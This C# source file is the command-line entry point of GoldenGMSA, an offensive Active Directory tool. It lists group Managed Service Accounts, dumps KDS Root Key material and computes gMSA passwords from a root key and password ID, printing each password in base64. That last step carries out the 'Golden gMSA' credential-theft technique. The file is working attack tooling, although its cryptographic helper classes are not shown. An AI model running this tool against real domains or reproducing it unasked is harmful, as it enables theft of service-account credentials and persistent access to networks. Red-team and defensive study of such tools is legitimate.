using CommandLine;
using CommandLine.Text;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Security.Principal;

namespace GoldenGMSA
{
    public class Program
    {
        static void Main(string[] args)
        {
            var parser = new Parser();

            var parserResult = parser.ParseArguments<GmsaInfoOptions, KdsInfoOptions, ComputePwdOptions>(args);

            parserResult
                .WithParsed<GmsaInfoOptions>(options => ProcessGmsaInfoOptions(options))
                .WithParsed<KdsInfoOptions>(options => ProcessKdsInfoOptions(options))
                .WithParsed<ComputePwdOptions>(options => ProcessComputePwdOptions(options))
                .WithNotParsed(errors =>
                {
                    var helpText = HelpText.AutoBuild(parserResult, h =>
                    {
                        h.AdditionalNewLineAfterOption = false;
                        var helpTxt = HelpText.DefaultParsingErrorsHandler(parserResult, h);
                        return helpTxt;
                    }, e =>
                    {
                        return e;
                    });
                    Console.Error.Write(helpText);
                });

            return;
        }

        static void ProcessGmsaInfoOptions(GmsaInfoOptions options)
        {
            Console.WriteLine();
            try
            {
                string domainName = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;

                if (options.Sid != null)
                {
                    var gmsa = GmsaAccount.GetGmsaAccountBySid(domainName, options.Sid);

                    if (gmsa != null)
                    {
                        Console.WriteLine(gmsa.ToString());
                    }
                    else
                    {
                        Console.WriteLine($"GMSA with SID {options.Sid} not found in domain {domainName}");
                    }
                }
                else
                {
                    var gmsaAccounts = GmsaAccount.FindAllGmsaAccountsInDomain(domainName);

                    foreach (var gmsa in gmsaAccounts)
                    {
                        Console.WriteLine(gmsa.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ERROR: {ex.Message}");
            }
        }

        static void ProcessKdsInfoOptions(KdsInfoOptions options)
        {
            Console.WriteLine();
            try
            {
                string forestName = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Forest.Name;

                if (options.KdsKeyGuid.HasValue)
                {
                    var rootKey = RootKey.GetRootKeyByGuid(forestName, options.KdsKeyGuid.Value);

                    if (rootKey == null)
                        Console.WriteLine($"KDS Root Key with ID {options.KdsKeyGuid.Value} not found");
                    else
                        Console.WriteLine(rootKey.ToString());
                }
                else
                {
                    var rootKeys = RootKey.GetAllRootKeys(forestName);

                    foreach (var rootKey in rootKeys)
                    {
                        Console.WriteLine(rootKey.ToString());
                    }                    
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"ERROR: {ex}");
            }
        }

        static void ProcessComputePwdOptions(ComputePwdOptions options)
        {
            Console.WriteLine();
            try
            {
                string domainName = "", forestName = "";

                if (options.Sid == null)
                    throw new ArgumentNullException(nameof(options.Sid));

                if (string.IsNullOrEmpty(options.KdsRootKeyBase64) || string.IsNullOrEmpty(options.ManagedPwdIdBase64))
                {
                    using (var currDomain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain())
                    {
                        domainName = currDomain.Name;
                        forestName = currDomain.Forest.Name;
                    }
                }

                MsdsManagedPasswordId pwdId = null;
                RootKey rootKey = null;

                if (string.IsNullOrEmpty(options.ManagedPwdIdBase64))
                {
                    pwdId = MsdsManagedPasswordId.GetManagedPasswordIDBySid(domainName, options.Sid);
                }
                else
                {
                    var pwdIdBytes = Convert.FromBase64String(options.ManagedPwdIdBase64);
                    pwdId = new MsdsManagedPasswordId(pwdIdBytes);
                }

                if (string.IsNullOrEmpty(options.KdsRootKeyBase64))
                {
                    rootKey = RootKey.GetRootKeyByGuid(forestName, pwdId.RootKeyIdentifier);
                }
                else
                {
                    var rootKeyBytes = Convert.FromBase64String(options.KdsRootKeyBase64);
                    rootKey = new RootKey(rootKeyBytes);
                }

                if (rootKey == null)
                {
                    Console.WriteLine($"Failed to locate KDS Root Key with ID {pwdId.RootKeyIdentifier}");
                    return;
                }

                var pwdBytes = GmsaPassword.GetPassword(options.Sid, rootKey, pwdId, domainName, forestName);

                Console.WriteLine($"Base64 Encoded Password:\t{Convert.ToBase64String(pwdBytes)}");
            }
            catch (Exception ex)
            {

                Console.WriteLine($"ERROR: {ex}");
            }
        }
    }

    [Verb("gmsainfo", HelpText = "Query GMSA information")]
    class GmsaInfoOptions
    {
        [Option('s', "sid", Required = false, HelpText = "The SID of the object to query")]
        public SecurityIdentifier Sid { get; set; }

        [Usage]
        public static IEnumerable<Example> Examples
        {
            get
            {
                yield return new Example(
                    @"Query for all gMSAs in the domain",
                    new GmsaInfoOptions
                    { });

                yield return new Example(
                    @"Query for specific gMSA identified by SID",
                    new GmsaInfoOptions
                    {
                        Sid = new SecurityIdentifier("S-1-5-21-2183999363-403723741-3725858571")
                    });
            }
        }
    }

    [Verb("kdsinfo", HelpText = "Query KDS Root Keys information")]
    class KdsInfoOptions
    {
        [Option('g', "guid", Required = false, HelpText = "The GUID of the KDS Root Key object")]
        public Guid? KdsKeyGuid { get; set; }

        [Usage]
        public static IEnumerable<Example> Examples
        {
            get
            {
                yield return new Example(
                    $"Query KDS Root Key identified by GUID {Guid.Parse("28676CD8-D9FC-4FE5-AD64-9C3C23F0EA16")}",
                    new KdsInfoOptions
                    {
                        KdsKeyGuid = Guid.Parse("28676CD8-D9FC-4FE5-AD64-9C3C23F0EA16")
                    });
            }
        }
    }

    [Verb("compute", HelpText = "Compute GMSA passwords")]
    class ComputePwdOptions
    {
        [Option('s', "sid", Required = true, HelpText = "The SID of the object")]
        public SecurityIdentifier Sid { get; set; }

        [Option('k', "kdskey", Required = false, Default = null, HelpText = "Base64 encoded KDS Root Key")]
        public string KdsRootKeyBase64 { get; set; }

        [Option('p', "pwdid", Required = false, Default = null, HelpText = "Base64 of msds-ManagedPasswordID attribute value")]
        public string ManagedPwdIdBase64 { get; set; }

        [Usage]
        public static IEnumerable<Example> Examples
        {
            get
            {
                yield return new Example(
                    $"Compute password for GMSA with SID S-1-5-21-2183999363-403723741-3725858571",
                    new ComputePwdOptions
                    {
                        Sid = new SecurityIdentifier("S-1-5-21-2183999363-403723741-3725858571")
                    });
            }
        }
    }
}
